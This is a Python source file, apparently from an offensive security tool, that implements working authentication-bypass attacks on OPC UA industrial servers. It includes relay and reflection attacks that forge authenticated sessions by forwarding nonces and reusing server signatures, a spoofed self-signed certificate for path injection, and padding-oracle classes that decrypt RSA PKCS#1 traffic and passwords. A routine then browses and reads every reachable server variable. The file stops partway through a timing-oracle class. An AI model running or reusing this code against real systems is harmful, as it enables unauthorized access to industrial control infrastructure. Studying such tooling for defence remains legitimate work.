import requests
requests.packages.urllib3.disable_warnings()

from Crypto.PublicKey.RSA import RsaKey

from messages import *
from message_fields import *
from typing import *
from crypto import *
from socket import socket, create_connection, create_server, SHUT_RDWR
from random import Random, randint
from enum import Enum, auto
from binascii import hexlify, unhexlify
from base64 import b64encode, b64decode
from datetime import datetime, timedelta
from pathlib import Path
from decimal import Decimal
from io import BytesIO

import sys, os, itertools, re, math, hashlib, json, time, dataclasses
import keepalive

# Logging and errors.
def log(msg : str):
  print(f'[*] {msg}', file=sys.stderr)
  
def log_success(msg : str):
  print(f'[+] {msg}')
  
# Integer division that rounds the result up.
def ceildiv(a,b):
  return a // b + (a % b and 1)
  
# Self signed certificate template (DER encoded) used for path injection attack.
SELFSIGNED_CERT_TEMPLATE = b64decode('MIIERDCCAyygAwIBAgIUcC5NBws70ghGv3jjkdIBjlcDRgMwDQYJKoZIhvcNAQELBQAwXTEUMBIGCgmSJomT8ixkARkWBHRlc3QxFzAVBgNVBAoMDk9QQyBGb3VuZGF0aW9uMRAwDgYDVQQIDAdBcml6b25hMQswCQYDVQQGEwJVUzENMAsGA1UEAwwEdGVzdDAeFw0yNDAzMTkxNDAwMTZaFw0yNTAzMTkxNDAwMTZaMF0xFDASBgoJkiaJk/IsZAEZFgR0ZXN0MRcwFQYDVQQKDA5PUEMgRm91bmRhdGlvbjEQMA4GA1UECAwHQXJpem9uYTELMAkGA1UEBhMCVVMxDTALBgNVBAMMBHRlc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGw8ewnzA+09uDx3zJd96FHLmzX2JhmTHdelPQgFz1UQxT1JLdjZv8uIpV5chcl/fvRga9kWzNS3YtADyG0LfmGfA6M5j/sfUatfOBEe1UJEO3TFpvRaeQd9KIIWk9XR5ue0bihR5Wk59f5jvo/RY4J/t3rWUny7R3HXrWxSlY0iskr3+sRkRIcYqqHehsCtJ2k1ZNUcN1HHV+FicRuf695Os1aoXBi/ViX1A4/3UmOrsHCXThj/4zEfbG5puJHBf5SMbjBjoZu7uCrYA53r/Wt3zLAnxKdbJjZ9nJP0x2pyzwd19JtqGqvKICdG/NKArjVxjjY2jqzGN/ExWB2mUbAgMBAAGjgfswgfgwDAYDVR0TAQH/BAIwADAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMA8GA1UdEQQIMAaGBHRlc3QwgYUGA1UdIwR+MHyAFIHIizG1yMWN1z6tsU9VYpeAyqoloWGkXzBdMRQwEgYKCZImiZPyLGQBGRYEdGVzdDEXMBUGA1UECgwOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgMB0FyaXpvbmExCzAJBgNVBAYTAlVTMQ0wCwYDVQQDDAR0ZXN0ggF7MB0GA1UdDgQWBBSByIsxtcjFjdc+rbFPVWKXgMqqJTANBgkqhkiG9w0BAQsFAAOCAQEAb9vxdW04fyXxjdNEHY5R4vDTNzyK2BIwb264tgrAtmAohXL4QqyXFxF6NcnpRv9n2iGhWLUpvE/LbGmU0s7Y8QmHHcngpwRkmasUlEUut3h9cZ9xshPrkVvNTY+SpSCzrNTL3dKv5AN04we6GZAPAhSfNeFKy80qQRxQYvuqL+/FqVCqjtLhQLxH8KQDtklCcDJh0YGgxesO7Zc1QhgFXg/YzcNEb3htgETpe281LCAxWJbhKqY+DuIeR/68halfxfryf10TRGcYYJG6H31jA69EJnaX3FwP592Gr5PY53VCuxQySOTUUKLkE4EdjRwA5SL8HabrCAebscOdwAeVLA==')
TEMPLATE_APP_URI = 'test'

# Fixed clientNonce value used within spoofed OpenSecureChannel requests.
SPOOFED_OPN_NONCE = unhexlify('1337133713371337133713371337133713371337133713371337133713371337')

# Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
# unexpected errors, which can have all kinds of causes). 
class AttackNotPossible(Exception):
  pass
  
# Protocols supported for current attacks.
class TransportProtocol(Enum):
  TCP_BINARY = auto()
  HTTPS = auto()
  
def proto_scheme(protocol : TransportProtocol) -> str:
  return {
    TransportProtocol.TCP_BINARY: "opc.tcp",
    TransportProtocol.HTTPS     : "https",
  }[protocol]
  
def parse_endpoint_url(url):
  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)', url)
  if not m:
    raise Exception(f'Don\'t know how to process endpoint url: {url}')
  else:
    protos = {
      "opc.tcp": TransportProtocol.TCP_BINARY,
      "https"  : TransportProtocol.HTTPS,
      "opc.https"  : TransportProtocol.HTTPS,
    }
    if m.group('scheme') not in protos:
      raise Exception(f'Unsupported protocol: "{m.group("scheme")}" in URL {url}.')
    return (protos[m.group('scheme')], *m.group('host', 'port'))

# Common routines.

# Send an OPC request message and receive a response.
def opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[OpcMessage] = None) -> OpcMessage:
  with sock.makefile('rwb') as sockio:
    sockio.write(request.to_bytes())
    sockio.flush()
    response = response_obj or request.__class__()
    response.from_bytes(sockio)
    return response
    
# Variant that supports response chunking. Yields each chunk as a separate response object.
def chunkable_opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[OpcMessage] = None) -> Iterator[OpcMessage]:
  with sock.makefile('rwb') as sockio:
    sockio.write(request.to_bytes())
    sockio.flush()
    done = False
    while not done:
      response = response_obj or request.__class__()
      done = response.from_bytes(sockio, allow_chunking=True)
      yield response    

# Sets up a binary TCP connection, does a plain hello and simply ignores the server's size and chunking wishes.
def connect_and_hello(url : str) -> socket:
  proto, host, port = parse_endpoint_url(url)
  assert proto == TransportProtocol.TCP_BINARY
  sock = create_connection((host,port))
  opc_exchange(sock, HelloMessage(
    version=0,
    receiveBufferSize=2**16,
    sendBufferSize=2**16,
    maxMessageSize=2**24,
    maxChunkCount=2**8,
    endpointUrl=url,
  ), AckMessage())
  return sock

def simple_requestheader(authToken : NodeId = NodeId(0,0)) -> requestHeader.Type:
  return requestHeader.create(
    authenticationToken=authToken,
    timeStamp=datetime.now(),
    requestHandle=0,
    returnDiagnostics=0,
    auditEntryId=None,
    timeoutHint=0,
    additionalHeader=None,
  )

@dataclass
class ChannelState:
  sock : socket
  channel_id: int
  token_id : int
  msg_counter : int
  securityMode : MessageSecurityMode
  crypto: Optional[SessionCrypto]

# Attempt to start a "Secure" channel with no signing or encryption.
def unencrypted_opn(sock: socket) -> ChannelState:
  reply = opc_exchange(sock, OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=SecurityPolicy.NONE,
    senderCertificate=None,
    receiverCertificateThumbprint=None,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=1,
      requestId=1,
      requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
        requestHeader=simple_requestheader(),
        clientProtocolVersion=0,
        requestType=SecurityTokenRequestType.ISSUE,
        securityMode=MessageSecurityMode.NONE,
        clientNonce=None,
        requestedLifetime=3600000,
      ))
    ))
  ))
  
  convrep, _ = encodedConversation.from_bytes(reply.encodedPart)
  resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
  return ChannelState(
    sock=sock,
    channel_id=resp.securityToken.channelId,
    token_id=resp.securityToken.tokenId,
    msg_counter=2,
    securityMode=MessageSecurityMode.NONE,
    crypto=None,
  )
  
# Do an OPN protocol handshake with a certificate and private key.
def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client_certificate : bytes, privkey : RsaKey) -> ChannelState:
  sp = endpoint.securityPolicyUri
  pk = certificate_publickey(endpoint.serverCertificate)
  
  if sp == SecurityPolicy.NONE:
    return unencrypted_opn(sock)
  else:
    client_nonce = os.urandom(32)
    plaintext = encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=1,
      requestId=1,
      requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
        requestHeader=simple_requestheader(),
        clientProtocolVersion=0,
        requestType=SecurityTokenRequestType.ISSUE,
        securityMode=endpoint.securityMode,
        clientNonce=client_nonce,
        requestedLifetime=3600000,
      ))
    ))
    msg = OpenSecureChannelMessage(
      secureChannelId=0,
      securityPolicyUri=sp,
      senderCertificate=client_certificate,
      receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
      encodedPart=plaintext
    )
    
    # Apply signing and encryption.
    msg.sign_and_encrypt(
      signer=lambda data: rsa_sign(sp, privkey, data),
      encrypter=lambda ptext: rsa_ecb_encrypt(sp, pk, ptext),
      plainblocksize=rsa_plainblocksize(sp, pk),
      cipherblocksize=pk.size_in_bytes(),
      sigsize=pk.size_in_bytes(),
    )    
    replymsg = opc_exchange(sock, msg)
    
    # Immediately start parsing plaintext, ignoring padding and signature.
    convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, replymsg.encodedPart))
    resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
    
    return ChannelState(
      sock=sock,
      channel_id=resp.securityToken.channelId,
      token_id=resp.securityToken.tokenId,
      msg_counter=2,
      securityMode=endpoint.securityMode,
      crypto=deriveKeyMaterial(sp, client_nonce, resp.serverNonce)
    )

# In case a response object has a header. Check it for error codes.
def check_status(response : NamedTuple):
  if hasattr(response, 'responseHeader') and response.responseHeader.serviceResult & 0x80000000:
    raise ServerError(response.responseHeader.serviceResult, f'Bad status code.')

# Exchange a conversation message, once the channel has been established by the OPN exchange.
def session_exchange(channel : ChannelState, 
                     reqfield : EncodableObjectField, respfield : EncodableObjectField, 
                     **req_data) -> NamedTuple:
  msg = ConversationMessage(
    secureChannelId=channel.channel_id,
    tokenId=channel.token_id,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=channel.msg_counter,
      requestId=channel.msg_counter,
      requestOrResponse=reqfield.to_bytes(reqfield.create(**req_data)),
    ))
  )
  
  crypto = channel.crypto
  assert crypto or channel.securityMode == MessageSecurityMode.NONE
  if channel.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT:
    msg.sign_and_encrypt(
      signer=lambda data: sha_hmac(crypto.policy, crypto.clientKeys.signingKey, data),
      encrypter=lambda ptext: aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, ptext),
      plainblocksize=16,
      cipherblocksize=16,
      sigsize=macsize(crypto.policy),
    )
  elif channel.securityMode == MessageSecurityMode.SIGN:
    msg.sign(lambda data: sha_hmac(crypto.policy, crypto.clientKeys.signingKey, data), macsize(crypto.policy))
    
  # Do the exchange.
  chunks = [reply.encodedPart for reply in chunkable_opc_exchange(channel.sock, msg)]
  
  # Decrypt/unsign if needed.
  respbytes = b''
  for chunk in chunks:
    if channel.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT:
      # Decrypt and unpad, while simply ignoring MAC.
      decrypted = aes_cbc_decrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, chunk)
      unsigned = decrypted[:-macsize(crypto.policy)]
      decoded = pkcs7_unpad(unsigned, 16)[:-1] if not unsigned.endswith(b'\x00') else unsigned[:-1]
    elif channel.securityMode == MessageSecurityMode.SIGN:
      # Just strip MAC.
      decoded = chunk[:-macsize(crypto.policy)]
    else:
      assert(channel.securityMode == MessageSecurityMode.NONE)
      decoded = chunk
    
    convo, _ = encodedConversation.from_bytes(decoded)
    respbytes += convo.requestOrResponse

  # Increment the message counter.
  channel.msg_counter += 1
    
  # Parse the response.
  resp, _ = respfield.from_bytes(respbytes)
  check_status(resp)
  return resp
  
# OPC exchange over HTTPS.
# https://reference.opcfoundation.org/Core/Part6/v105/docs/7.4
def https_exchange(
    url : str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
  headers = {
    'Content-Type': 'application/octet-stream',
  }
  if nonce_policy is not None:
    headers['OPCUA-SecurityPolicy'] =  f'http://opcfoundation.org/UA/SecurityPolicy#{nonce_policy.value}'
  
  if url.startswith('opc.http'):
    url = url[4:]
  reqbody = reqfield.to_bytes(reqfield.create(**req_data))
  http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
  resp = respfield.from_bytes(http_resp.content)[0]
  check_status(resp)
  return resp

# Picks either session_exchange or https_exchanged based on channel type.
def generic_exchange(
    chan_or_url : ChannelState | str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
    if type(chan_or_url) == ChannelState:
      return session_exchange(chan_or_url, reqfield, respfield, **req_data)
    else:
      assert type(chan_or_url) == str and parse_endpoint_url(chan_or_url)[0] == TransportProtocol.HTTPS
      return https_exchange(chan_or_url, nonce_policy, reqfield, respfield, **req_data)

# Request endpoint information from a server.
def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
  try:  
    if ep_url.startswith('opc.tcp://'):
      with connect_and_hello(ep_url) as sock:
        chan = unencrypted_opn(sock)
        resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
          requestHeader=simple_requestheader(),
          endpointUrl=ep_url,
          localeIds=[],
          profileUris=[],
        )
    else:
      assert(parse_endpoint_url(ep_url)[0] == TransportProtocol.HTTPS)
      resp = https_exchange(ep_url, None, getEndpointsRequest, getEndpointsResponse, 
          requestHeader=simple_requestheader(),
          endpointUrl=ep_url,
          localeIds=[],
          profileUris=[],
      )
        
    return resp.endpoints
  except Exception as ex:
    if ep_url.endswith('/discovery'):
      raise ex
    else:
      # Try again while adding /discovery to URL.
      return get_endpoints(f'{ep_url.rstrip("/")}/discovery')


# Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
def execute_relay_attack(
    imp_chan : ChannelState | str, imp_endpoint : endpointDescription.Type,
    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type,
    prefer_certauth : bool = False
  ) -> NodeId:
    def csr(chan, client_ep, server_ep, nonce):
      return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=client_ep.server._replace(applicationUri=applicationuri_from_cert(client_ep.serverCertificate)), # Prosys needs this.
        serverUri=server_ep.server.applicationUri,
        endpointUrl=server_ep.endpointUrl,
        sessionName=None,
        clientNonce=nonce,
        clientCertificate=client_ep.serverCertificate,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )

    # Send CSR to login_endpoint, pretending we're imp_endpoint. Use arbitrary nonce.
    log(f'Creating first session on login endpoint ({login_endpoint.endpointUrl})')
    createresp1 = csr(login_chan, imp_endpoint, login_endpoint, os.urandom(32))
    
    # Now send the server nonce of this channel as a client nonce on the other channel.
    log(f'Got server nonce: {hexlify(createresp1.serverNonce)}')
    log(f'Forwarding nonce to second session on impersonate endpoint ({imp_endpoint.endpointUrl})')
    createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
    log(f'Got signature over nonce: {hexlify(createresp2.serverSignature.signature)}')
    
    if createresp2.serverSignature.signature is None:
      raise AttackNotPossible('Server did not sign nonce. Perhaps certificate was rejected, or an OPN attack may be needed first.')
    
    # Make a token with an anonymous or certificate-based user identity policy.
    anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
    cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
    if anon_policies and not (prefer_certauth and cert_policies):
      usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
      usersig = signatureData.create(algorithm=None,signature=None)
    elif cert_policies:
      log('User certificate required. Reusing the server certificate to forge user token.')
      usertoken = x509IdentityToken.create(
        policyId=cert_policies[0].policyId, 
        certificateData=imp_endpoint.serverCertificate
      )
      
      # Simply reuse the clientSignature, since we're using the same cert and nonce for that.
      usersig = createresp2.serverSignature
    else:
      raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
    
    # Now activate the first session using the signature from the second session.
    log(f'Using signature log in to {login_endpoint.endpointUrl}.')
    generic_exchange(login_chan, login_endpoint.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
      requestHeader=simple_requestheader(createresp1.authenticationToken),
      clientSignature=createresp2.serverSignature,
      clientSoftwareCertificates=[],
      localeIds=[],
      userIdentityToken=usertoken,
      userTokenSignature=usersig,
    )
    
    # Return auth token if succesful.
    return createresp1.authenticationToken

# Demonstrate access by recursively browsing nodes. Variables are read.
# Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : SecurityPolicy = None):
  max_children = 100
  recursive_nodeclasses = {NodeClass.OBJECT}
  read_nodeclasses = {NodeClass.VARIABLE}
  
  def browse_from(root, depth):
    bresp = generic_exchange(chan, policy, browseRequest, browseResponse,
      requestHeader=simple_requestheader(authToken),
      view=viewDescription.default_value,
      requestedMaxReferencesPerNode=max_children,
      nodesToBrowse=[browseDescription.create(
        nodeId=root,
        browseDirection=BrowseDirection.FORWARD,
        referenceTypeId=NodeId(0,0), #NodeId(0, 33),
        includeSubtypes=True,
        nodeClassMask=0x00, # All classes
        resultMask=0x3f,    # All results
      )],
    )
    
    tree_prefix = ' ' * (depth - 1) + '|'
    for result in bresp.results:
      for ref in result.references:
        if ref.nodeClass in recursive_nodeclasses:
          # Keep browsing recursively.
          log_success(tree_prefix + f'+ {ref.displayName.text} ({ref.nodeClass.name})')
          browse_from(ref.nodeId.nodeId, depth + 1)
        elif ref.nodeClass in read_nodeclasses:
          # Read current variable value. For the sake of simplicity do one at a time.
          try:
            readresp = generic_exchange(chan, policy, readRequest, readResponse,
              requestHeader=simple_requestheader(authToken),
              maxAge=0,
              timestampsToReturn=TimestampsToReturn.BOTH,
              nodesToRead=[readValueId.create(
                nodeId=ref.nodeId.nodeId,
                attributeId=0x0d, # Request value
                indexRange=None,
                dataEncoding=QualifiedNameField().default_value,
              )],
            )
            
            for r in readresp.results:
              if type(r.value) == list:
                log_success(tree_prefix + f'+ {ref.displayName.text} (Array):')
                for subval in r.value:
                  log_success(' ' + tree_prefix + f'+ {ref.displayName.text}: "{subval}"')
              else:
                log_success(tree_prefix + f'- {ref.displayName.text}: "{r.value}"')
          except UnsupportedFieldException as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{ex.fieldname}>')
          except DecodeError as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <decode error> ("{ex}")')
          except Exception as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <<{ex}>> ("{ex}")')
        else:
          log_success(tree_prefix + f'- {ref.displayName.text} ({ref.nodeClass.name})')
          
    if len(bresp.results) >= max_children:
      log_success(tree_prefix + '- ...')
    
  log('Trying to browse data via authenticated channel.')
  log('Tree: ')
  log_success('+ <root>')
  browse_from(NodeId(0, 84), 1)
  log('Finished browsing.') 

# Reflection attack: log in to a server with its own identity.
def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path, timing_threshold : float, timing_expansion : int):
  proto, host, port = parse_endpoint_url(url)
  log(f'Attempting reflection attack against {url}')
  endpoints = get_endpoints(url)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Try to attack against the first endpoint with an HTTPS transport and a non-None security policy.
  https_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.transportProfileUri.endswith('https-uabinary')]
  if https_eps:
    target = https_eps[0]
    tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
    assert tproto == TransportProtocol.HTTPS
    url = target.endpointUrl
    log(f'Targeting {url} with {target.securityPolicyUri.name} security policy.')
    token = execute_relay_attack(url, target, url, target)
    log_success(f'Attack succesfull! Authenticated session set up with {url}.')
    if demo:
      demonstrate_access(url, token, target.securityPolicyUri)
  elif try_opn_oracle or try_password_oracle:
    tcp_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.securityPolicyUri != SecurityPolicy.AES256_SHA256_RSAPSS and ep.transportProfileUri.endswith('uatcp-uasc-uabinary')]
    if tcp_eps:
      # Decryption padding oracle is a bit faster when plaintext is already pkcs#1, so prefer that.
      tcp_eps.sort(key=lambda ep: ep.securityPolicyUri != SecurityPolicy.BASIC128RSA15)
      target = tcp_eps[0]
      tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
      assert tproto == TransportProtocol.TCP_BINARY
      
      log(f'No HTTPS endpoints. Trying to bypass secure channel on {target.endpointUrl} via padding oracle.')
      chan = bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file, timing_threshold, timing_expansion)
      log(f'Trying reflection attack (if channel is still alive).')
      try:
        token = execute_relay_attack(chan, target, chan, target)
      except ServerError as err:
        if err.errorcode == 0x80870000:
          raise AttackNotPossible('Server returning BadSecureChannelTokenUnknown error. Probably means that the channel expired during the time needed for the padding oracle attack.')
        elif err.errorcode == 0x807f0000:
          raise AttackNotPossible('Server returning BadTcpSecureChannelUnknown error. Probably means that the channel expired during the time needed for the padding oracle attack.')
        else:
          raise err
        
      log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
      if demo:
        demonstrate_access(chan, token, target.securityPolicyUri)      
    else:
      raise AttackNotPossible('No endpoints applicable (TCP/HTTPS transport and a non-None security policy are required; also, support for Aes256_Sha256_RsaPss is currently not implemented yet).')
    
  else:
    raise AttackNotPossible('Server does not support HTTPS endpoint (with non-None security policy). Try with --bypass-opn instead.')
      
def relay_attack(source_url : str, target_url : str, demo : bool):
  log(f'Attempting relay from {source_url} to {target_url}')
  seps = get_endpoints(source_url)
  log(f'Listed {len(seps)} endpoints from {source_url}.')
  teps = get_endpoints(target_url)
  log(f'Listed {len(teps)} endpoints from {target_url}.')
  
  # Prioritize HTTPS targets with a non-NONE security policy.
  teps.sort(key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
  
  tmpsock = None
  prefercert = False
  try:
    for sep, tep in itertools.product(seps, teps):
      # Source must be HTTPS and non-NONE.
      if sep.transportProfileUri.endswith('https-uabinary') and sep.securityPolicyUri != SecurityPolicy.NONE:
        oraclechan = sep.endpointUrl
        supports_usercert = any(p.tokenType == UserTokenType.CERTIFICATE for p in tep.userIdentityTokens)
        
        if tep.transportProfileUri.endswith('https-uabinary'):
          # HTTPS target.
          mainchan = tep.endpointUrl
        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE and supports_usercert:
          # When only a TCP target is available we can still try to spoof a user cert.
          tmpsock = connect_and_hello(tep.endpointUrl)
          mainchan = unencrypted_opn(tmpsock)
          prefercert = True
        else:
          continue
          
        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({tep.securityPolicyUri.name})')
        token = execute_relay_attack(oraclechan, sep, mainchan, tep, prefercert)
        log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
        if demo:
          demonstrate_access(mainchan, token, tep.securityPolicyUri)
        return
    
    raise AttackNotPossible('TODO: implement --bypass-opn for relay attack.')
  except ServerError as err:
    if err.errorcode == 0x80550000 and target_url.startswith('opc.tcp'):
      raise AttackNotPossible('Security policy rejected by server. Perhaps user authentication over NONE channel is blocked.')
    else:
      raise err
  finally:
    if tmpsock:
      tmpsock.shutdown(SHUT_RDWR)
      tmpsock.close()
  
class PaddingOracle(ABC):
  def __init__(self, endpoint : endpointDescription.Type):
    self._endpoint = endpoint
    self._active = False
    self._has_timed_out = False
  
  @abstractmethod
  def _setup(self):
    ...
  
  @abstractmethod
  def _cleanup(self):
    ...
    
  @abstractmethod
  def _attempt_query(self, ciphertext : bool) -> bool:
    ...
    
  # Pick an applicable and preferred endpoint.
  @classmethod
  @abstractmethod
  def pick_endpoint(clazz, endpoints : List[endpointDescription.Type]) -> Optional[endpointDescription.Type]:
    ...
    
  def query(self, ciphertext : bytes):
    if self._active and not self._has_timed_out:
      try:
        return self._attempt_query(ciphertext)
      except KeyboardInterrupt as ex:
        # Don't retry when user CTRL+C's.
        raise ex
      except (TimeoutError, ConnectionResetError):
        # Stop reusing connections once a timeout or connection reset has happened once.
        self._has_timed_out = True
      except:
        # On any misc. exception, assume the connection is broken and reset it.
        try:
          self._cleanup()
        except:
          pass
    
    self._setup()
    self._active = True
    return self._attempt_query(ciphertext)
    
# For some reason, one implementation leaves the TCP connection open after failure but stops responding. Put a
# timeout on the socket (kinda arbitrarily picked 10 seconds) to cause a breaking exception when this happens.
PO_SOCKET_TIMEOUT = 10
    
class OPNPaddingOracle(PaddingOracle):
  def _setup(self):
    self._socket = connect_and_hello(self._endpoint.endpointUrl)
    self._msg = OpenSecureChannelMessage(
      secureChannelId=0,
      securityPolicyUri=SecurityPolicy.BASIC128RSA15,
      senderCertificate=self._endpoint.serverCertificate,
      receiverCertificateThumbprint=certificate_thumbprint(self._endpoint.serverCertificate),
      encodedPart=b''
    )
    
    self._socket.settimeout(PO_SOCKET_TIMEOUT)
    
  def _cleanup(self):
   self._socket.shutdown(SHUT_RDWR)
   self._socket.close()
   
  def _attempt_query(self, ciphertext):
    try:
      self._msg.encodedPart = ciphertext
      opc_exchange(self._socket, self._msg)
      return True
    except ServerError as err:      
      if err.errorcode == 0x80580000:
        return True
      elif err.errorcode == 0x80130000:
        return False
      elif err.errorcode == 0x80010000:
        # Prosys specific oracle.
        return 'block incorrect' not in err.reason
      else:
        raise err
      
  @classmethod
  def pick_endpoint(clazz, endpoints):
    return max(
      (ep for ep in endpoints if ep.transportProfileUri.endswith('uatcp-uasc-uabinary')),
      key=lambda ep: ep.securityPolicyUri == SecurityPolicy.BASIC128RSA15,
      default=None
    )
    
class PasswordPaddingOracle(PaddingOracle):
  def __init__(self, 
    endpoint : endpointDescription.Type, 
    goodpadding_errors = [0x80200000, 0x80130000],
    badpadding_errors =  [0x80210000, 0x801f0000, 0x80b00000],
  ):
    super().__init__(endpoint)
    self._policyId = self._preferred_tokenpolicy(endpoint).policyId
    self._goodpad = goodpadding_errors
    self._badpad = badpadding_errors
  
  
  @classmethod
  def _preferred_tokenpolicy(_, endpoint):    
    policies = sorted(endpoint.userIdentityTokens, reverse=True, 
      key=lambda t: (
        t.tokenType == UserTokenType.USERNAME, 
        t.securityPolicyUri == SecurityPolicy.BASIC128RSA15,
        t.securityPolicyUri is None or t.securityPolicyUri == SecurityPolicy.NONE,
      )
    )
    
    if policies and policies[0].tokenType == UserTokenType.USERNAME:
      return policies[0]
    else:
      return None

  
  def _setup(self):
    proto, _, _ = parse_endpoint_url(self._endpoint.endpointUrl)
    if proto == TransportProtocol.TCP_BINARY:
      sock = connect_and_hello(self._endpoint.endpointUrl)
      self._chan = unencrypted_opn(sock)
    else:
      assert proto == TransportProtocol.HTTPS
      self._chan = self._endpoint.endpointUrl
    
    # Just reflect session data during CreateSession.
    sresp = generic_exchange(self._chan, SecurityPolicy.NONE, createSessionRequest, createSessionResponse, 
      requestHeader=simple_requestheader(),
      clientDescription=self._endpoint.server,
      serverUri=self._endpoint.server.applicationUri,
      endpointUrl=self._endpoint.endpointUrl,
      sessionName=None,
      clientNonce=os.urandom(32),
      clientCertificate=self._endpoint.serverCertificate,
      requestedSessionTimeout=600000,
      maxResponseMessageSize=2**24,
    )
    self._header = simple_requestheader(sresp.authenticationToken)
    
  def _cleanup(self):
    if type(self._chan) == ChannelState:
      self._chan.sock.shutdown(SHUT_RDWR)
      self._chan.sock.close()

  def _attempt_query(self, ciphertext):
    token = userNameIdentityToken.create(
      policyId=self._policyId,
      userName='pwdtestnotarealuser',
      password=ciphertext,
      encryptionAlgorithm='http://www.w3.org/2001/04/xmlenc#rsa-1_5',
    )
    
    try:
      generic_exchange(self._chan, SecurityPolicy.NONE, activateSessionRequest, activateSessionResponse, 
        requestHeader=self._header,
        clientSignature=signatureData.create(algorithm=None, signature=None),
        clientSoftwareCertificates=[],
        localeIds=[],
        userIdentityToken=token,
        userTokenSignature=signatureData.create(algorithm=None, signature=None),
      )
      return True
    except ServerError as err:
      # print(hex(err.errorcode))
      if err.errorcode in self._goodpad:
        # print('.', end='', file=sys.stderr, flush=True)
        return False
      elif err.errorcode in self._badpad:
        return True
      else:
        raise err
        
  @classmethod
  def pick_endpoint(clazz, endpoints):
    # Only works with None security policy and password login support.
    options = [ep 
      for ep in endpoints if ep.securityPolicyUri == SecurityPolicy.NONE and \
      any(t.tokenType == UserTokenType.USERNAME for t in ep.userIdentityTokens)
    ]
    
    if not options:
      return None
    
    # Prefer endpoints that actually advertise PKCS#1 (if not, they may still accept it). 
    # Otherwise, prefer None over OAEP (upgrade more likely accepted than downgrade).
    # Security policies being equal, prefer binary transport.
    return max(options, 
      key=lambda ep: (
        clazz._preferred_tokenpolicy(ep).securityPolicyUri == SecurityPolicy.BASIC128RSA15,
        clazz._preferred_tokenpolicy(ep).securityPolicyUri in [None, SecurityPolicy.NONE],
        ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
      )
    )
    
class AltPasswordPaddingOracle(PasswordPaddingOracle):
  # Different interpretation of error codes.
  def __init__(self, endpoint):
    super().__init__(endpoint, [0x80130000], [0x80200000, 0x80210000, 0x801f0000, 0x80b00000])

    
class TimingBasedPaddingOracle(PaddingOracle):
  def __init__(self, 
    endpoint, 
    base_oracle : PaddingOracle,    # Padding oracle technique to use for timing when False is returned.
    timing_threshold : float = 0.5, # When processing takes longer than this many seconds, asumming correct padding.
    ctext_expansion : int = 50,     # How many times bigger to repeat the ciphertext
    verify_repeats : int = 2,       # How many times to repeat 'slow' query before confidence that padding is correct.
  ):
    super().__init__(endpoint)
    self._base = base_oracle
    self._threshold = timing_threshold
    self._repeats = verify_repeats
    self._expansion = ctext_expansion
  
  def _setup(self):
    # To improve reliability, repeat setup for every single attempt.
    pass
    
  def _cleanup(self):
   pass
   
